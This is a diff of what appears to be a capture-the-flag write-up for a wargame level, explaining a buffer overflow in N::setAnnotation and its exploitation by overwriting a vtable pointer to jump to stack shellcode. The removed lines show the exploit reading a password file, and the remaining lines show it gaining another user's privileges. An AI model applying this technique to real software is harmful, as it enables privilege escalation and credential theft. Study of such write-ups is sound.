@@ -78,14 +78,6 @@ int    N::operator-(N *this ,N *arg)
 A buffer overflow vulnerability resides in `N::setAnnotation` because it doesn't force a buffer size instead it relies on the argument's length. we can exploit this through overwriting the vtable pointer of the class that is used to reference `operator+` so instead of calling it, it will call something else, in our case we'll make it jump to the shellcode in the stack.
 
 ```
-$ ./level9 $(python /tmp/shellcode9.py)
-$ whoami
-bonus0
-$ cat /home/user/bonus0/.pass
-f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
-```
-
-```
 ~$ env -i ./level9 $(/tmp/ex.sh "\x7c\xff\xff\xbf")
 $ id
 uid=2009(level9) gid=2009(level9) euid=2010(bonus0) egid=100(users) groups=2010(bonus0),100(users),2009(level9)
